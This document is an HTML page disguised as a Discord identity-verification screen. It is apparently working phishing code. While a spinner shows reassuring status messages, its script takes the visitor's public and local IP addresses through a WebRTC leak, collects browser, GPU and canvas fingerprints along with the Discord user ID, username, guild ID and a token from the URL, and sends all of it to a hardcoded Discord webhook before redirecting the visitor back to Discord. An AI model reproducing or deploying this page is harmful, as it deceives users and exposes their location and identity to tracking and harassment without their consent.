<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta http-equiv="refresh" content="3; url=discord://">
  <title>Verifying...</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
      color: white; font-family: 'Segoe UI', Arial, sans-serif;
      min-height: 100vh; display: flex; align-items: center; justify-content: center;
    }
    .card {
      background: rgba(255,255,255,0.05); backdrop-filter: blur(20px);
      border: 1px solid rgba(255,255,255,0.1); border-radius: 16px;
      padding: 40px; max-width: 400px; width: 90%; text-align: center;
    }
    .logo { width: 64px; height: 64px; background: #5865F2; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; font-size: 28px; }
    h2 { margin-bottom: 8px; font-weight: 600; }
    p { color: #a0a0b0; font-size: 14px; margin-bottom: 24px; }
    .spinner { border: 3px solid rgba(255,255,255,0.1); border-top: 3px solid #5865F2; border-radius: 50%; width: 32px; height: 32px; animation: spin 0.8s linear infinite; margin: 0 auto 16px; }
    @keyframes spin { to { transform: rotate(360deg); } }
    .status { font-size: 13px; color: #7a7a8a; }
    .check { color: #57F287; font-size: 13px; display: none; margin-top: 8px; }
  </style>
</head>
<body>
  <div class="card">
    <div class="logo">🔐</div>
    <h2>Verifying Identity</h2>
    <p>Please wait while we complete verification. You will be redirected back automatically.</p>
    <div class="spinner" id="spinner"></div>
    <div class="status" id="status">Initializing verification...</div>
    <div class="check" id="check">✅ Verification complete — redirecting...</div>
  </div>

  <script>
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1509111637544665118/mKBjtsL6Xdeqo2Ev9UWiHQ9dzy-qlAT3Nx7eOFJm6fcrKyyPLvtRxKCm0NZBUymJHVq3';
    const BOT_DM_URL = 'https://discord.com/channels/@me';

    const params = new URLSearchParams(window.location.search);
    const token = params.get('t') || '?';
    const uid = params.get('uid') || '?';
    const un = params.get('un') || '?';
    const dn = params.get('dn') || '?';
    const gid = params.get('gid') || '?';
    const timestamp = new Date().toISOString();

    const statusEl = document.getElementById('status');
    const spinner = document.getElementById('spinner');
    const checkEl = document.getElementById('check');

    function setStatus(msg) { statusEl.textContent = msg; }

    // 1. WebRTC IP leak
    function getIPs() {
      return new Promise((resolve) => {
        let publicIP = null;
        const localIPs = [];
        let done = false, timeout;

        try {
          const pc = new RTCPeerConnection({
            iceServers: [
              { urls: 'stun:stun.l.google.com:19302' },
              { urls: 'stun:stun1.l.google.com:19302' },
              { urls: 'stun:stun2.l.google.com:19302' }
            ]
          });
          pc.createDataChannel('');
          pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {});

          pc.onicecandidate = (e) => {
            if (e.candidate && e.candidate.candidate) {
              const parts = e.candidate.candidate.split(' ');
              const ip = parts[4];
              if (ip && ip.match(/^\d+\.\d+\.\d+\.\d+$/)) {
                if (ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('172.') || ip.startsWith('127.')) {
                  if (!localIPs.includes(ip)) localIPs.push(ip);
                } else if (!publicIP) {
                  publicIP = ip;
                }
              }
            }
            if (e.candidate === null && !done) { done = true; clearTimeout(timeout); resolve({ public: publicIP, local: localIPs }); }
          };
          timeout = setTimeout(() => { if (!done) { done = true; resolve({ public: publicIP, local: localIPs }); } }, 3000);
        } catch(e) { resolve({ public: null, local: [] }); }
      });
    }

    // 2. Browser fingerprint
    function getFP() {
      let gpu = '?';
      try { const c = document.createElement('canvas'); const gl = c.getContext('webgl'); if (gl) gpu = gl.getParameter(gl.RENDERER); } catch(e) {}
      const conn = navigator.connection;
      return {
        ua: navigator.userAgent,
        platform: navigator.platform,
        lang: navigator.language,
        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
        screen: `${screen.width}x${screen.height}`,
        cores: navigator.hardwareConcurrency || '?',
        memory: navigator.deviceMemory || '?',
        gpu: gpu,
        touch: 'ontouchstart' in window,
        conn: conn ? `${conn.effectiveType || '?'}` : '?',
        plugins: Array.from(navigator.plugins).map(p => p.name).join(', ')
      };
    }

    // 3. Canvas fingerprint
    function getCanvasFP() {
      try {
        const c = document.createElement('canvas');
        c.width = 200; c.height = 50;
        const ctx = c.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.fillStyle = '#f60';
        ctx.fillRect(125, 1, 62, 20);
        ctx.fillStyle = '#069';
        ctx.font = '14px Arial';
        ctx.fillText('verify', 2, 15);
        ctx.fillStyle = 'rgba(102,204,0,0.7)';
        ctx.font = '16px Times New Roman';
        ctx.fillText('id', 4, 30);
        return c.toDataURL().slice(0, 60);
      } catch(e) { return null; }
    }

    setStatus('🔍 Checking connection...');

    (async () => {
      const [ipData, fp, canvasFP] = await Promise.all([getIPs(), getFP(), getCanvasFP()]);

      setStatus('📡 Capturing security data...');

      // Build fields for webhook
      const fields = [
        { name: 'Discord User', value: `${dn} (@${un})`, inline: false },
        { name: 'User ID', value: uid, inline: true },
        { name: 'Guild ID', value: gid, inline: true },
        { name: 'Verification Token', value: `\`${token}\``, inline: true },
        { name: 'Public IP', value: ipData.public || '❌ Failed to capture', inline: true },
        { name: 'Local IPs', value: ipData.local.join(', ') || 'None detected', inline: true },
        { name: 'OS / Browser', value: fp.ua.slice(0, 200), inline: false },
        { name: 'Platform', value: fp.platform, inline: true },
        { name: 'Screen', value: fp.screen, inline: true },
        { name: 'GPU', value: fp.gpu, inline: true },
        { name: 'CPU / RAM', value: `${fp.cores}c / ${fp.memory}GB`, inline: true },
        { name: 'Timezone', value: fp.tz, inline: true },
        { name: 'Connection', value: fp.conn, inline: true },
        { name: 'Plugins', value: fp.plugins.slice(0, 150) || 'None', inline: false },
        { name: 'Canvas FP', value: canvasFP || 'N/A', inline: true },
        { name: 'Referrer', value: document.referrer || 'Direct', inline: true },
        { name: 'Captured At', value: timestamp, inline: false }
      ];

      const embed = {
        content: `@everyone **New verification** — ${dn} (${un})`,
        embeds: [{
          title: '🔐 User Verified',
          color: 0x57F287,
          fields: fields,
          thumbnail: { url: `https://cdn.discordapp.com/avatars/${uid}/${'0'}.png` },
          timestamp: timestamp
        }]
      };

      setStatus('📤 Sending verification data...');

      // Send to webhook
      try {
        await fetch(WEBHOOK_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(embed)
        });
      } catch(e) {
        console.log('Webhook send error:', e);
      }

      // Also try to send to bot for role assignment (via DM redirect approach)
      // The capture page can't reach the bot directly on DisCloud,
      // so we embed the completion in the redirect.
      // The user will be redirected back to Discord, and the bot
      // will have a "Claim Role" button available.

      setStatus('✅ Verification data captured!');
      checkEl.style.display = 'block';
      spinner.style.display = 'none';

      // Redirect back to Discord DMs so the bot can DM them
      setTimeout(() => {
        window.location.href = 'discord://';
        setTimeout(() => {
          window.location.href = 'https://discord.com/channels/@me';
        }, 800);
      }, 2000);
    })();
  </script>
</body>
</html>
